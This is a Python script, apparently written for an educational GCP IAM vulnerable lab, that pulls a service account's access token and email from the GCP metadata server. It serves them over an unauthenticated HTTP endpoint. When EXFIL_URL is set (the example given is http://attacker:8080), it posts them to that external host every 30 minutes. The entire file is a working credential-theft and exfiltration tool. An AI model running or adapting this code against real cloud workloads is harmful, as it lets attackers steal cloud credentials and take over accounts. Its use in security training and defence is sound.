#!/usr/bin/env python3
"""Token Extractor - Returns GCP SA token from metadata server.

For use with GCP IAM Vulnerable - an educational security training environment.

Endpoints:
  /        - Returns the access token JSON
  /token   - Same as /
  /email   - Returns the service account email
  /info    - Returns email, scopes, and token
  /health  - Health check endpoint

Environment Variables:
  EXFIL_URL  - If set, POSTs token info to this URL on startup (e.g., http://attacker:8080)
  PORT       - HTTP server port (default: 8080)
"""
import http.server
import json
import os
import threading
import time
import urllib.request

METADATA_URL = "http://metadata.google.internal/computeMetadata/v1"
METADATA_HEADERS = {"Metadata-Flavor": "Google"}


def get_metadata(path):
    """Fetch data from GCP metadata server."""
    url = "{}/{}".format(METADATA_URL, path)
    req = urllib.request.Request(url, headers=METADATA_HEADERS)
    try:
        with urllib.request.urlopen(req, timeout=5) as response:
            return response.read().decode("utf-8")
    except Exception as e:
        return "Error: {}".format(e)


def exfil_token(url, interval=None):
    """POST token info to external URL. If interval set, repeat every N seconds."""
    while True:
        try:
            info = {
                "email": get_metadata("instance/service-accounts/default/email"),
                "token": get_metadata("instance/service-accounts/default/token"),
            }
            data = json.dumps(info).encode("utf-8")
            req = urllib.request.Request(url, data=data, method="POST")
            req.add_header("Content-Type", "application/json")
            urllib.request.urlopen(req, timeout=10)
            print("Token exfiltrated to {}".format(url))
        except Exception as e:
            print("Exfil failed: {}".format(e))

        if interval:
            time.sleep(interval)
        else:
            break


class TokenHandler(http.server.BaseHTTPRequestHandler):
    def do_GET(self):
        if self.path == "/" or self.path == "/token":
            token_data = get_metadata("instance/service-accounts/default/token")
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(token_data.encode())
        elif self.path == "/email":
            email = get_metadata("instance/service-accounts/default/email")
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(email.encode())
        elif self.path == "/info":
            info = {
                "email": get_metadata("instance/service-accounts/default/email"),
                "scopes": get_metadata("instance/service-accounts/default/scopes"),
                "token": get_metadata("instance/service-accounts/default/token"),
            }
            self.send_response(200)
            self.send_header("Content-Type", "application/json")
            self.end_headers()
            self.wfile.write(json.dumps(info, indent=2).encode())
        elif self.path == "/health":
            self.send_response(200)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"OK")
        else:
            self.send_response(404)
            self.send_header("Content-Type", "text/plain")
            self.end_headers()
            self.wfile.write(b"Endpoints: /, /token, /email, /info, /health")

    def log_message(self, format, *args):
        pass


if __name__ == "__main__":
    # If EXFIL_URL is set, POST token on startup and every 30 minutes
    exfil_url = os.environ.get("EXFIL_URL")
    if exfil_url:
        print("Exfiltration enabled to: {}".format(exfil_url))
        # Run exfil in background thread every 1800 seconds (30 min)
        t = threading.Thread(target=exfil_token, args=(exfil_url, 1800), daemon=True)
        t.start()

    port = int(os.environ.get("PORT", 8080))
    server = http.server.HTTPServer(("", port), TokenHandler)
    print("Token extractor listening on port {}".format(port))
    server.serve_forever()
